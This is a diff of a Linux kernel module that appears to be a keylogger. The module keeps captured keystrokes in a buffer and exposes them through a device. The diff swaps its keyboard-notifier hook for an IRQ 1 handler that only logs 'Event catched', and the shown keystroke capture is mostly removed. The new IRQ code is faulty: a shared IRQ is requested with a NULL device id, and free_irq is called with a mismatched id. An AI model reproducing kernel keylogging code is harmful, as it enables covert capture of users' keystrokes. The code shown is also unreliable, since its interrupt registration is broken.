@@ -156,21 +156,11 @@ static int	handle_keysym(struct keyboard_notifier_param *param)
 	return NOTIFY_OK;
 }
 
-static int	key_pressed(struct notifier_block *self, unsigned long action,
-				void *data)
+static irqreturn_t	key_pressed(int irq, void *dummy)
 {
-	if (action == KBD_KEYCODE)
-		return handle_keycode(data);
-	else if (action == KBD_KEYSYM)
-		return handle_keysym(data);
-	return NOTIFY_DONE;
+	pr_info("Event catched\n");
+	return IRQ_HANDLED;
 }
-
-static struct notifier_block	nb = {
-	.notifier_call = &key_pressed,
-	.priority = 0,
-	.next = NULL,
-};
 
 static int	next_return(int start)
 {
@@ -299,11 +289,10 @@ static int	__init kl_init(void)
 		return -ret;
 	}
 	pr_info("%s: Module loaded\n", MODULE_NAME);
-	ret = register_keyboard_notifier(&nb);
+	ret = request_irq(1, key_pressed, IRQF_SHARED, "keyboard", NULL);
 	if (ret) {
 		misc_deregister(&logs_device);
-		pr_err("%s: Registering keyboard notifier failed\n",
-			MODULE_NAME);
+		pr_err("%s: Registering IRQ failed\n", MODULE_NAME);
 		return -ret;
 	}
 	captured_max_size = 10;
@@ -311,7 +300,7 @@ static int	__init kl_init(void)
 					sizeof(struct key_stroke), GFP_KERNEL);
 	if (!captured_keys) {
 		misc_deregister(&logs_device);
-		unregister_keyboard_notifier(&nb);
+		free_irq(1, key_pressed);
 		return 1;
 	}
 	pr_info("%s: Keyboard notifier registered\n", MODULE_NAME);
@@ -324,11 +313,8 @@ static void	__exit kl_cleanup(void)
 	misc_deregister(&logs_device);
 	kfree(log_file);
 	kfree(captured_keys);
-	if (unregister_keyboard_notifier(&nb))
-		pr_err("%s: Error when unregistering keyboard notifier\n",
-			MODULE_NAME);
-	else
-		pr_info("%s: Keyboard notifier unregistered\n", MODULE_NAME);
+	free_irq(1, key_pressed);
+	pr_info("%s: IRQ unregistered\n", MODULE_NAME);
 	pr_info("%s: Module unloaded\n", MODULE_NAME);
 }
 
